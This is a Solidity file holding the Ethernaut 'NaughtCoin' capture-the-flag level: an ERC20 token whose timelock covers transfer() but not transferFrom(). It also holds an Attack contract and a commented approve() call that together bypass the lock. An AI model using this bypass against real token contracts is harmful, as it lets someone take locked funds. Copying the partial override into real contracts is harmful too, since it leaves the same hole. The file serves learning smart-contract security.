// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 


// await contract.approve("0xdadd1084E2832751BF148532C9DEDf72B1441642", '1000000000000000000000000')


contract Attack {

  NaughtCoin public naughtCoin;

  constructor() public {
    naughtCoin = NaughtCoin(0x1C13f3B7137b68bbe928b80071D2c28a3B036496);
  }

  function executeTransfer(address _from, address _to, uint256 _value) public {
    naughtCoin.transferFrom(_from, _to, _value);
  }

}